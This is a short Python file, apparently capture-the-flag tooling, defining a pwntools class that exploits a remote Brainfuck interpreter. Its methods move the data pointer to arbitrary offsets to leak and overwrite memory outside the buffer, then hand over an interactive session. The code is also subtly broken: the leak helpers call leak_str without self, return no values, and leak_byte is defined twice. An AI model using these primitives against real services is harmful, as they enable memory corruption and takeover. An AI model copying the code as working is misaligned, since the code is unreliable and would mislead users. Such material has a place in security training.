from brainfuck import *
from pwn import *

class BrainfuckExploiter(object):
	def __init__(self, conn):
		'''
		recv a pwntools tube
		'''

		self._conn = conn
		self._bf = Brainfuck()
		self._input = ''
		self._expected_output_length = 0

	def _move_pointer(self, offset):
		'''
		moves the pointer to the given offset from the buffer base
		'''

		need_to_move = offset - self._bf.get_offset()
		self._conn.send(self._bf.move(need_to_move))

	def leak_str(self, offset, length):
		'''
		leaks from <offset> bytes from the buffer base
		'''
		self._move_pointer(offset)
		for _ in range(length):
			self._conn.send(self._bf.print())
			self._expected_output_length += 1
			self._conn.send(self._bf.forwards())

	def leak_dword(self, offset):
		u32(leak_str(offset, 4))
		
	def leak_byte(self, offset):
		u16(leak_str(offset, 2))

	def leak_byte(self, offset):
		u8(leak_str(offset, 1))

	def write(self, offset, content):
		self._move_pointer(offset)
		for c in content:
			self._conn.send(self._bf.write())
			self._input += str(c)
			self._conn.send(self._bf.forwards())
		
	def interactive(self):
		self._conn.interactive()
		
	def run(self):
		self._conn.send('\n')
		self._conn.send(self._input)
		return